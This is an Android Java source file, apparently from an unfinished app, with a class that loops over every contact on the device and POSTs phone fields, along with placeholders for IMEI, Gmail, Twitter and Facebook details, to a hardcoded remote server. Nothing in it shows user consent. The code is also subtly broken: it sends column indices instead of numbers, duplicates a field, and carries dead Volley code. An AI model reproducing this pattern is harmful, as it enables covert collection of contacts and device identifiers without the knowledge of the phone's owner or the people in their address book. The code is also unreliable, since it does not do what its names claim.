package com.example.cka.smartckeckdata;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.util.Log;
//import com.android.volley.toolbox.Volley;
//import com.android.volley.RequestQueue;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class SaveUserCheckData {
    private static String url ="http://smart-data-tech.com/dev/API/v1/saveuser/";

    public static Context contextOfApplication;
    //final ContentResolver cf = getApplicationContext( this).getContentResolver();
    public static Context getContextOfApplication() {
        return contextOfApplication;
    }

    public static ContentResolver tryGetContentResolver(Context c){
        ContentResolver contentResolver = c.getContentResolver();
        return contentResolver;
    }


        public static void SaveUserPhoneNumber() {
           // contextOfApplicatio =
        final Cursor cur;
        //final ContentResolver cr = getConten.getContentResolver();
       final ContentResolver cr = tryGetContentResolver(getContextOfApplication());

        cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        List<String> lstcontacts = new ArrayList<String>();
        //s'il ya un au moins un contact
        if (cur.getCount() > 0) {
            //je boucle sur les contacts
            while (cur.moveToNext()) {

                //je recupère l'id et le nom du contact
                final String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                //final String nom = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));


                //verification du numero
                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor envoi = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "= ?",
                            new String[]{id}, null);
                    //final String x= null;

                    while (envoi.moveToNext()) {
                        EnvoiPost(url,
                                envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)),
                                "Imei","version",
                                "model","duree","gmail","twitter","fb","dateins",
                                "actif","actif");

                        //String x = envoi.getString(envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));*/

                          /*////////  final String x = envoi.getString(envoi.getColumnIndex((ContactsContract.CommonDataKinds.Phone.NUMBER)));

                        }
                        //final String y = x;
                        /////enregistrement icciiiiiii////////////////////////////////////
                        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext());
                        //str=null;
                        // if (isConnected()) {
                        StringRequest stringRequest = new StringRequest(Request.Method.POST, url, new Response.Listener<String>() {
                            @Override
                            public void onResponse(String response) {
                                //Log.d("mon message","c'est ici"+nom);
                            }
                        }, new Response.ErrorListener() {
                            @Override
                            public void onErrorResponse(VolleyError error) {

                            }
                        }) {
                            @Override
                            protected Map<String, String> getParams() throws AuthFailureError {
                                Map<String, String> params = new HashMap<String, String>();
                                String numero = getNumero(cur,id,cr);
                                //params.put("idcontact", cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID)));
                                params.put("nom", cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME)));
                                params.put("numero", numero);

                                return params;
                            }
                        };

                        requestQueue.add(stringRequest);

                        // }
                    }*/

                    }
                }

            }
        }
    }
    public static void EnvoiPost(String Url, int tel1, int tel2,int tell3,int tel4, String imei, String version, String model, String duree_activite,
                          String gmail, String twitter, String fb, String dat_ins, String etat,String statut) {

        HttpClient client = new DefaultHttpClient();
        HttpPost post = new HttpPost(Url);
        try {
            List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
            nameValuePairs.add(new BasicNameValuePair("tel1",Integer.toString(tel1)));
            nameValuePairs.add(new BasicNameValuePair("tel2",Integer.toString(tel2)));
            nameValuePairs.add(new BasicNameValuePair("tell3",Integer.toString(tell3)));
            nameValuePairs.add(new BasicNameValuePair("tell4",Integer.toString(tell3)));
            nameValuePairs.add(new BasicNameValuePair("imei",imei));
            nameValuePairs.add(new BasicNameValuePair("version",version));
            nameValuePairs.add(new BasicNameValuePair("model",model));
            nameValuePairs.add(new BasicNameValuePair("duree_activite",duree_activite));
            nameValuePairs.add(new BasicNameValuePair("gmail",gmail));
            nameValuePairs.add(new BasicNameValuePair("twitter",twitter));
            nameValuePairs.add(new BasicNameValuePair("fb",fb));
            nameValuePairs.add(new BasicNameValuePair("dat_ins",dat_ins));
            nameValuePairs.add(new BasicNameValuePair("etat",etat));
            nameValuePairs.add(new BasicNameValuePair("statut",statut));

            post.setEntity(new UrlEncodedFormEntity(nameValuePairs));

            HttpResponse response = client.execute(post);
            Log.i("reponse est", response.toString());
            /*BufferedReader rd = new BufferedReader(new InputStreamReader(
                    response.getEntity().getContent()));
            String line = "";
            while ((line = rd.readLine()) != null) {
                System.out.println(line);
            }*/

        } catch (IOException e) {
            e.printStackTrace();
        }

    }

}